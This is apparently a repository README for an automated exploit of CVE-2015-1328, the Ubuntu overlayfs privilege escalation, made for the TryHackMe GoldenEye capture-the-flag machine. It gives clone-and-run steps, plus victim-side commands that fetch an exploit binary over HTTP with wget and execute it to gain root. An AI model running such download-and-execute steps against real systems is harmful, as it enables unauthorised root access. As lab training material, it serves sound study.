# CVE-2015-1328-GoldenEye


# about exploit:
The overlayfs implementation in the linux (aka Linux kernel) package before 3.19.0-21.21 in Ubuntu through 15.04 does not properly check permissions for file creation in the upper filesystem directory, which allows local users to obtain root access by leveraging a configuration in which overlayfs is permitted in an arbitrary mount namespace. 

Thanks to rebel

# Config

This is an automated exploit for CVE-2015-1328 for GoldenEye CTF from TryHackMe 
by default, gcc isn't available in that machine so, i configured the gcc to cc and accordingly ran the exploit to gain root privileges.

# Simply clone the repo and run exploit.sh 

# On Attacker's machine:

Installation

Just, Clone this repository - 

    $ git clone https://github.com/0x1ns4n3/CVE-2015-1328-GoldenEye.git
    $ cd CVE-2015-1328-GoldenEye
    $ chmod +x exploit.sh
    $ bash exploit.sh
    
    
# On Victim's machine :

    $ wget http://<target ip>:6969/exploit
    
    $ chmod +x exploit
    
    $ ./exploit

